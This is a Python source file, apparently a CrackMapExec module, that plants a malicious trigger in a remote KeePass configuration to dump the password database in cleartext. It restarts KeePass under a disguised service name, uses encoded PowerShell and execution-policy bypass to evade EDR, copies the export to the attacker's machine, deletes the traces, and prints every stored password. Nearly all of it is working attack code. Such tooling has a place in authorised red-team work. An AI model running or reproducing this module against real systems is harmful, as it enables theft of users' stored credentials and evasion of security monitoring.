import os
import sys
import json
from xmltodict import parse
from time import sleep
from csv import reader
from base64 import b64encode
from io import BytesIO, StringIO
from xml.etree import ElementTree
from cme.helpers.powershell import get_ps_script


class CMEModule:
    """
    Make use of KeePass' trigger system to export the database in cleartext
    References: https://keepass.info/help/v2/triggers.html
                https://web.archive.org/web/20211017083926/http://www.harmj0y.net:80/blog/redteaming/keethief-a-case-study-in-attacking-keepass-part-2/

    Module by @d3lb3, inspired by @harmj0y work
    """

    name = "keepass_trigger"
    description = "Set up a malicious KeePass trigger to export the database in cleartext."
    supported_protocols = ["smb"]
    # while the module only executes legit powershell commands on the target (search and edit files)
    # some EDR like Trend Micro flag base64-encoded powershell as malicious
    # the option PSH_EXEC_METHOD can be used to avoid such execution, and will drop scripts on the target
    opsec_safe = False
    multiple_hosts = False

    def __init__(self):
        # module options
        self.action = None
        self.keepass_config_path = None
        self.keepass_user = None
        self.export_name = "export.xml"
        self.export_path = "C:\\Users\\Public"
        self.powershell_exec_method = "PS1"

        # additional parameters
        self.share = "C$"
        self.remote_temp_script_path = "C:\\Windows\\Temp\\temp.ps1"
        self.keepass_binary_path = "C:\\Program Files\\KeePass Password Safe 2\\KeePass.exe"
        self.local_export_path = "/tmp"
        self.trigger_name = "export_database"
        self.poll_frequency_seconds = 5
        self.dummy_service_name = "OneDrive Sync KeePass"

        with open(get_ps_script("keepass_trigger_module/RemoveKeePassTrigger.ps1"), "r") as remove_trigger_script_file:
            self.remove_trigger_script_str = remove_trigger_script_file.read()

        with open(get_ps_script("keepass_trigger_module/AddKeePassTrigger.ps1"), "r") as add_trigger_script_file:
            self.add_trigger_script_str = add_trigger_script_file.read()

        with open(get_ps_script("keepass_trigger_module/RestartKeePass.ps1"), "r") as restart_keepass_script_file:
            self.restart_keepass_script_str = restart_keepass_script_file.read()

    def options(self, context, module_options):
        """
        ACTION (mandatory)      Performs one of the following actions, specified by the user:
                                  ADD           insert a new malicious trigger into KEEPASS_CONFIG_PATH's specified file
                                  CHECK         check if a malicious trigger is currently set in KEEPASS_CONFIG_PATH's
                                                specified file
                                  RESTART       restart KeePass using a Windows service (used to force trigger reload),
                                                if multiple KeePass process are running, rely on USER option
                                  POLL          search for EXPORT_NAME file in EXPORT_PATH folder
                                                (until found, or manually exited by the user)
                                  CLEAN         remove malicious trigger from KEEPASS_CONFIG_PATH as well as database
                                                export files from EXPORT_PATH
                                  ALL           performs ADD, CHECK, RESTART, POLL, CLEAN actions one after the other

        KEEPASS_CONFIG_PATH     Path of the remote KeePass configuration file where to add a malicious trigger
                                (used by ADD, CHECK and CLEAN actions)
        USER                    Targeted user running KeePass, used to restart the appropriate process
                                (used by RESTART action)

        EXPORT_NAME             Name fo the database export file, default: export.xml
        EXPORT_PATH             Path where to export the KeePass database in cleartext
                                default: C:\\Users\\Public, %APPDATA% works well too for user permissions

        PSH_EXEC_METHOD         Powershell execution method, may avoid detections depending on the AV/EDR in use
                                (while no 'malicious' command is executed):
                                  ENCODE        run scripts through encoded oneliners
                                  PS1           run scripts through a file dropped in C:\\Windows\\Temp (default)

        Not all variables used by the module are available as options (ex: trigger name, temp folder path, etc.),
        but they can still be easily edited in the module __init__ code if needed
        """

        if "ACTION" in module_options:
            if module_options["ACTION"] not in [
                "ADD",
                "CHECK",
                "RESTART",
                "SINGLE_POLL",
                "POLL",
                "CLEAN",
                "ALL",
            ]:
                context.log.fail("Unrecognized action, use --options to list available parameters")
                exit(1)
            else:
                self.action = module_options["ACTION"]
        else:
            context.log.fail("Missing ACTION option, use --options to list available parameters")
            exit(1)

        if "KEEPASS_CONFIG_PATH" in module_options:
            self.keepass_config_path = module_options["KEEPASS_CONFIG_PATH"]

        if "USER" in module_options:
            self.keepass_user = module_options["USER"]

        if "EXPORT_NAME" in module_options:
            self.export_name = module_options["EXPORT_NAME"]

        if "EXPORT_PATH" in module_options:
            self.export_path = module_options["EXPORT_PATH"]

        if "PSH_EXEC_METHOD" in module_options:
            if module_options["PSH_EXEC_METHOD"] not in ["ENCODE", "PS1"]:
                context.log.fail("Unrecognized powershell execution method, use --options to list available parameters")
                exit(1)
            else:
                self.powershell_exec_method = module_options["PSH_EXEC_METHOD"]

    def on_admin_login(self, context, connection):
        if self.action == "ADD":
            self.add_trigger(context, connection)
        elif self.action == "CHECK":
            self.check_trigger_added(context, connection)
        elif self.action == "RESTART":
            self.restart(context, connection)
        elif self.action == "POLL":
            self.poll(context, connection)
        elif self.action == "CLEAN":
            self.clean(context, connection)
            self.restart(context, connection)
        elif self.action == "ALL":
            self.all_in_one(context, connection)

    def add_trigger(self, context, connection):
        """Add a malicious trigger to a remote KeePass config file using the powershell script AddKeePassTrigger.ps1"""

        # check if the specified KeePass configuration file exists
        if self.trigger_added(context, connection):
            context.log.display(f"The specified configuration file {self.keepass_config_path} already contains a trigger called '{self.trigger_name}', skipping")
            return

        context.log.display(f"Adding trigger '{self.trigger_name}' to '{self.keepass_config_path}'")

        # prepare the trigger addition script based on user-specified parameters (e.g: trigger name, etc)
        # see data/keepass_trigger_module/AddKeePassTrigger.ps1 for the full script
        self.add_trigger_script_str = self.add_trigger_script_str.replace("REPLACE_ME_ExportPath", self.export_path)
        self.add_trigger_script_str = self.add_trigger_script_str.replace("REPLACE_ME_ExportName", self.export_name)
        self.add_trigger_script_str = self.add_trigger_script_str.replace("REPLACE_ME_TriggerName", self.trigger_name)
        self.add_trigger_script_str = self.add_trigger_script_str.replace("REPLACE_ME_KeePassXMLPath", self.keepass_config_path)

        # add the malicious trigger to the remote KeePass configuration file
        if self.powershell_exec_method == "ENCODE":
            add_trigger_script_b64 = b64encode(self.add_trigger_script_str.encode("UTF-16LE")).decode("utf-8")
            add_trigger_script_cmd = f"powershell.exe -e {add_trigger_script_b64}"
            connection.execute(add_trigger_script_cmd)
            sleep(2)  # as I noticed some delay may happen with the encoded powershell command execution
        elif self.powershell_exec_method == "PS1":
            try:
                self.put_file_execute_delete(context, connection, self.add_trigger_script_str)
            except Exception as e:
                context.log.fail(f"Error while adding malicious trigger to file: {e}")
                sys.exit(1)

        # checks if the malicious trigger was effectively added to the specified KeePass configuration file
        if self.trigger_added(context, connection):
            context.log.success(f"Malicious trigger successfully added, you can now wait for KeePass reload and poll the exported files")
        else:
            context.log.fail(f"Unknown error when adding malicious trigger to file")
            sys.exit(1)

    def check_trigger_added(self, context, connection):
        """check if the trigger is added to the config file XML tree"""

        if self.trigger_added(context, connection):
            context.log.display(f"Malicious trigger '{self.trigger_name}' found in '{self.keepass_config_path}'")
        else:
            context.log.display(f"No trigger '{self.trigger_name}' found in '{self.keepass_config_path}'")

    def restart(self, context, connection):
        """Force the restart of KeePass process using a Windows service defined using the powershell script RestartKeePass.ps1
        If multiple process belonging to different users are running simultaneously,
        relies on the USER option to choose which one to restart"""

        # search for keepass processes
        search_keepass_process_command_str = 'powershell.exe "Get-Process keepass* -IncludeUserName | Select-Object -Property Id,UserName,ProcessName | ConvertTo-CSV -NoTypeInformation"'
        search_keepass_process_output_csv = connection.execute(search_keepass_process_command_str, True)
        # we return the powershell command as a CSV for easier column parsing
        csv_reader = reader(search_keepass_process_output_csv.split("\n"), delimiter=",")
        next(csv_reader)  # to skip the header line
        keepass_process_list = list(csv_reader)
        # check if multiple processes belonging to different users are running (in order to choose which one to restart)
        keepass_users = []
        for process in keepass_process_list:
            keepass_users.append(process[1])
        if len(keepass_users) == 0:
            context.log.fail("No running KeePass process found, aborting restart")
            return
        elif len(keepass_users) == 1:  # if there is only 1 KeePass process running
            # if KEEPASS_USER option is specified then we check if the user matches
            if self.keepass_user and (keepass_users[0] != self.keepass_user and keepass_users[0].split("\\")[1] != self.keepass_user):
                context.log.fail(f"Specified user {self.keepass_user} does not match any KeePass process owner, aborting restart")
                return
            else:
                self.keepass_user = keepass_users[0]
        elif len(keepass_users) > 1 and self.keepass_user:
            found_user = False  # we search through every KeePass process owner for the specified user
            for user in keepass_users:
                if user == self.keepass_user or user.split("\\")[1] == self.keepass_user:
                    self.keepass_user = keepass_users[0]
                    found_user = True
            if not found_user:
                context.log.fail(f"Specified user {self.keepass_user} does not match any KeePass process owner, aborting restart")
                return
        else:
            context.log.fail("Multiple KeePass processes were found, please specify parameter USER to target one")
            return

        context.log.display("Restarting {}'s KeePass process".format(keepass_users[0]))

        # prepare the restarting script based on user-specified parameters (e.g: keepass user, etc)
        # see data/keepass_trigger_module/RestartKeePass.ps1
        self.restart_keepass_script_str = self.restart_keepass_script_str.replace("REPLACE_ME_KeePassUser", self.keepass_user)
        self.restart_keepass_script_str = self.restart_keepass_script_str.replace("REPLACE_ME_KeePassBinaryPath", self.keepass_binary_path)
        self.restart_keepass_script_str = self.restart_keepass_script_str.replace("REPLACE_ME_DummyServiceName", self.dummy_service_name)

        # actually performs the restart on the remote target
        if self.powershell_exec_method == "ENCODE":
            restart_keepass_script_b64 = b64encode(self.restart_keepass_script_str.encode("UTF-16LE")).decode("utf-8")
            restart_keepass_script_cmd = "powershell.exe -e {}".format(restart_keepass_script_b64)
            connection.execute(restart_keepass_script_cmd)
        elif self.powershell_exec_method == "PS1":
            try:
                self.put_file_execute_delete(context, connection, self.restart_keepass_script_str)
            except Exception as e:
                context.log.fail("Error while restarting KeePass: {}".format(e))
                return

    def poll(self, context, connection):
        """Search for the cleartext database export file in the specified export folder
        (until found, or manually exited by the user)"""
        found = False
        context.log.display(f"Polling for database export every {self.poll_frequency_seconds} seconds, please be patient")
        context.log.display("we need to wait for the target to enter his master password ! Press CTRL+C to abort and use clean option to cleanup everything")
        # if the specified path is %APPDATA%, we need to check in every user's folder
        if self.export_path == "%APPDATA%" or self.export_path == "%appdata%":
            poll_export_command_str = "powershell.exe \"Get-LocalUser | Where {{ $_.Enabled -eq $True }} | select name | ForEach-Object {{ Write-Output ('C:\\Users\\'+$_.Name+'\\AppData\\Roaming\\{}')}} | ForEach-Object {{ if (Test-Path $_ -PathType leaf){{ Write-Output $_ }}}}\"".format(self.export_name)
        else:
            export_full_path = f"'{self.export_path}\\{self.export_name}'"
            poll_export_command_str = 'powershell.exe "if (Test-Path {} -PathType leaf){{ Write-Output {} }}"'.format(export_full_path, export_full_path)

        # we poll every X seconds until the export path is found on the remote machine
        while not found:
            poll_exports_command_output = connection.execute(poll_export_command_str, True)
            if self.export_name not in poll_exports_command_output:
                print(".", end="", flush=True)
                sleep(self.poll_frequency_seconds)
                continue
            print("")

            # once a database is found, downloads it to the attackers machine
            context.log.success("Found database export !")
            # in case multiple exports found (may happen if several users exported the database to their APPDATA)
            for count, export_path in enumerate(poll_exports_command_output.split("\r\n")):
                try:
                    buffer = BytesIO()
                    connection.conn.getFile(self.share, export_path.split(":")[1], buffer.write)

                    # if multiple exports found, add a number at the end of local path to prevent override
                    if count > 0:
                        local_full_path = self.local_export_path + "/" + self.export_name.split(".")[0] + "_" + str(count) + "." + self.export_name.split(".")[1]
                    else:
                        local_full_path = self.local_export_path + "/" + self.export_name

                    # downloads the exported database
                    with open(local_full_path, "wb") as f:
                        f.write(buffer.getbuffer())
                    remove_export_command_str = "powershell.exe Remove-Item {}".format(export_path)
                    connection.execute(remove_export_command_str, True)
                    context.log.success('Moved remote "{}" to local "{}"'.format(export_path, local_full_path))
                    found = True
                except Exception as e:
                    context.log.fail("Error while polling export files, exiting : {}".format(e))

    def clean(self, context, connection):
        """Checks for database export + malicious trigger on the remote host, removes everything"""
        # if the specified path is %APPDATA%, we need to check in every user's folder
        if self.export_path == "%APPDATA%" or self.export_path == "%appdata%":
            poll_export_command_str = "powershell.exe \"Get-LocalUser | Where {{ $_.Enabled -eq $True }} | select name | ForEach-Object {{ Write-Output ('C:\\Users\\'+$_.Name+'\\AppData\\Roaming\\{}')}} | ForEach-Object {{ if (Test-Path $_ -PathType leaf){{ Write-Output $_ }}}}\"".format(self.export_name)
        else:
            export_full_path = f"'{self.export_path}\\{self.export_name}'"
            poll_export_command_str = 'powershell.exe "if (Test-Path {} -PathType leaf){{ Write-Output {} }}"'.format(export_full_path, export_full_path)
        poll_export_command_output = connection.execute(poll_export_command_str, True)

        # deletes every export found on the remote machine
        if self.export_name in poll_export_command_output:
            # in case multiple exports found (may happen if several users exported the database to their APPDATA)
            for export_path in poll_export_command_output.split("\r\n"):
                context.log.display(f"Database export found in '{export_path}', removing")
                remove_export_command_str = f"powershell.exe Remove-Item {export_path}"
                connection.execute(remove_export_command_str, True)
        else:
            context.log.display(f"No export found in {self.export_path} , everything is cleaned")

        # if the malicious trigger was not self-deleted, deletes it
        if self.trigger_added(context, connection):
            # prepare the trigger deletion script based on user-specified parameters (e.g: trigger name, etc)
            # see data/keepass_trigger_module/RemoveKeePassTrigger.ps1
            self.remove_trigger_script_str = self.remove_trigger_script_str.replace("REPLACE_ME_KeePassXMLPath", self.keepass_config_path)
            self.remove_trigger_script_str = self.remove_trigger_script_str.replace("REPLACE_ME_TriggerName", self.trigger_name)

            # actually performs trigger deletion
            if self.powershell_exec_method == "ENCODE":
                remove_trigger_script_b64 = b64encode(self.remove_trigger_script_str.encode("UTF-16LE")).decode("utf-8")
                remove_trigger_script_command_str = f"powershell.exe -e {remove_trigger_script_b64}"
                connection.execute(remove_trigger_script_command_str, True)
            elif self.powershell_exec_method == "PS1":
                try:
                    self.put_file_execute_delete(context, connection, self.remove_trigger_script_str)
                except Exception as e:
                    context.log.fail(f"Error while deleting trigger, exiting: {e}")
                    sys.exit(1)

            # check if the specified KeePass configuration file does not contain the malicious trigger anymore
            if self.trigger_added(context, connection):
                context.log.fail(f"Unknown error while removing trigger '{self.trigger_name}', exiting")
            else:
                context.log.display(f"Found trigger '{self.trigger_name}' in configuration file, removing")
        else:
            context.log.success(f"No trigger '{self.trigger_name}' found in '{self.keepass_config_path}', skipping")

    def all_in_one(self, context, connection):
        """Performs ADD, RESTART, POLL and CLEAN actions one after the other"""
        context.log.highlight("")
        self.add_trigger(context, connection)
        context.log.highlight("")
        self.restart(context, connection)
        self.poll(context, connection)
        context.log.highlight("")
        context.log.display("Cleaning everything...")
        self.clean(context, connection)
        self.restart(context, connection)
        context.log.highlight("")
        context.log.display("Extracting password...")
        self.extract_password(context)

    def trigger_added(self, context, connection):
        """check if the trigger is added to the config file XML tree (returns True/False)"""
        # check if the specified KeePass configuration file exists
        if not self.keepass_config_path:
            context.log.fail("No KeePass configuration file specified, exiting")
            sys.exit(1)

        try:
            buffer = BytesIO()
            connection.conn.getFile(self.share, self.keepass_config_path.split(":")[1], buffer.write)
        except Exception as e:
            context.log.fail(f"Error while getting file '{self.keepass_config_path}', exiting: {e}")
            sys.exit(1)

        try:
            keepass_config_xml_root = ElementTree.fromstring(buffer.getvalue())
        except Exception as e:
            context.log.fail(f"Error while parsing file '{self.keepass_config_path}', exiting: {e}")
            sys.exit(1)

        # check if the specified KeePass configuration file does not already contain the malicious trigger
        for trigger in keepass_config_xml_root.findall(".//Application/TriggerSystem/Triggers/Trigger"):
            if trigger.find("Name").text == self.trigger_name:
                return True

        return False

    def put_file_execute_delete(self, context, connection, psh_script_str):
        """Helper to upload script to a temporary folder, run then deletes it"""
        script_str_io = StringIO(psh_script_str)
        connection.conn.putFile(self.share, self.remote_temp_script_path.split(":")[1], script_str_io.read)
        script_execute_cmd = "powershell.exe -ep Bypass -F {}".format(self.remote_temp_script_path)
        connection.execute(script_execute_cmd, True)
        remove_remote_temp_script_cmd = 'powershell.exe "Remove-Item "{}""'.format(self.remote_temp_script_path)
        connection.execute(remove_remote_temp_script_cmd)

    def extract_password(self, context):
        xml_doc_path = os.path.abspath(self.local_export_path + "/" + self.export_name)
        xml_tree = ElementTree.parse(xml_doc_path)
        root = xml_tree.getroot()
        to_string = ElementTree.tostring(root, encoding="UTF-8", method="xml")
        xml_to_dict = parse(to_string)
        dump = json.dumps(xml_to_dict)
        obj = json.loads(dump)

        if len(obj["KeePassFile"]["Root"]["Group"]["Entry"]):
            for obj2 in obj["KeePassFile"]["Root"]["Group"]["Entry"]:
                for password in obj2["String"]:
                    if password["Key"] == "Password":
                        context.log.highlight(str(password["Key"]) + " : " + str(password["Value"]["#text"]))
                    else:
                        context.log.highlight(str(password["Key"]) + " : " + str(password["Value"]))
                context.log.highlight("")
        if len(obj["KeePassFile"]["Root"]["Group"]["Group"]):
            for obj2 in obj["KeePassFile"]["Root"]["Group"]["Group"]:
                try:
                    for obj3 in obj2["Entry"]:
                        for password in obj3["String"]:
                            if password["Key"] == "Password":
                                context.log.highlight(str(password["Key"]) + " : " + str(password["Value"]["#text"]))
                            else:
                                context.log.highlight(str(password["Key"]) + " : " + str(password["Value"]))
                        context.log.highlight("")
                except KeyError:
                    pass
